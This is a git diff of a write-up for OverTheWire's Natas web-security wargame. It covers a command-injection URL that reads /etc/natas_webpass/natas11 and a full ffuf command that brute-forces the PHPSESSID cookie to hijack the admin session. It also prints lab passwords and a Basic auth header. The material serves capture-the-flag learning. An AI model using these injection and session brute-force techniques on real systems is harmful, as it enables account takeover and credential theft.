@@ -196,13 +196,13 @@ URL:      http://natas8.natas.labs.overthewire.org
 
 This time also the website welcomed me with a input requesting for secret key and also there was a link to the source code of the logic behind the secret key validation.
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 This time the secret key was encoded and the function/algorithm that is used to encode the secret key was given.&#x20;
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Let's breakdown the above function into steps:
 
@@ -220,7 +220,7 @@ The above decoding steps can be performed with CyberChef.
 
 CyberChef has a handy URL scheme that preserves data and operations, so I can link directly to the solution: [https://gchq.github.io/CyberChef/#recipe=From\_Hex('None')Reverse('Character')From\_Base64('A-Za-z0-9%2B/%3D',true,false)\&input=M2QzZDUxNjM0Mzc0NmQ0ZDZkNmMzMTU2Njk1NjMzNjI](https://gchq.github.io/CyberChef/#recipe=From\_Hex\('None'\)Reverse\('Character'\)From\_Base64\('A-Za-z0-9%2B/%3D',true,false\)\&input=M2QzZDUxNjM0Mzc0NmQ0ZDZkNmMzMTU2Njk1NjMzNjI)
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 On giving the decoded string as the input, got the password for the next level.
 
@@ -293,7 +293,7 @@ where:
 
 Direct link to solution: [http://natas10.natas.labs.overthewire.org/?needle=+%22%22+%2Fetc%2Fnatas\_webpass%2Fnatas11+%23\&submit=Search](http://natas10.natas.labs.overthewire.org/?needle=+%22%22+%2Fetc%2Fnatas\_webpass%2Fnatas11+%23\&submit=Search)
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -861,5 +861,70 @@ The password for the next level has been obtained from the output of the above s
 Username: natas18
 Password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
 URL:      http://natas18.natas.labs.overthewire.org
+```
+
+This time we got a login page and also a link to the source code. And its mentioned that, we have to login as the admin to get the password for next level.
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+On checking the source code. we can see the `maxid` variable, which defines the maximum number of users, in this case `640` users, and also you can see that the function my\_session\_start looks out for a session cookie named `PHPSESSID`.
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Let's try to login with some random credentials. The application responded that "You are logged in as a regular user. Login as an admin to retrieve credentials for `natas19`".
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+I captured the request of the above login attempt with burpsuite. On checking it, the response to the logic request responded back with a cookie `PHPSESSID=184`.
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+So I decided to brute force this cookie value to find the id of the admin. For that, first I created a word list that contains all the possible user id's ( since we know the maximum number of users is `640` ).
+
+```bash
+for i in {0..640}; do echo $i >> 640.txt; done
+```
+
+Next, I used `ffuf` to brute force the cookie value using the word list that we generated above using the following command.&#x20;
+
+{% code lineNumbers="true" %}
+```bash
+ffuf -w 640.txt:FUZZ \
+    -u $'http://natas18.natas.labs.overthewire.org/index.php' \
+    -X $'POST' \
+    -H $'Host: natas18.natas.labs.overthewire.org' \
+    -H $'Content-Length: 31' -H $'Cache-Control: max-age=0' \
+    -H $'Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==' \
+    -H $'Upgrade-Insecure-Requests: 1' \
+    -H $'Origin: http://natas18.natas.labs.overthewire.org' \
+    -H $'Content-Type: application/x-www-form-urlencoded' \
+    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' \
+    -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+    -H $'Referer: http://natas18.natas.labs.overthewire.org/' \
+    -H $'Accept-Encoding: gzip, deflate, br' \
+    -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
+    -H $'Connection: close' \
+    -b $'PHPSESSID=FUZZ' \
+    -d $'username=admin&password=somoene' \
+    -fr "You are logged in as a regular user."
+```
+{% endcode %}
+
+From the result of above `ffuf` command, we can see that `119` was the only id that didn't had the line "You are logged in as a regular user." in its response.
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+So I tried to login with a session id of `119`, it worked and got the password for the next level.
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## Level 18 - Level 19
+
+```
+Username: natas19
+Password: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+URL:      http://natas19.natas.labs.overthewire.org
 ```
 
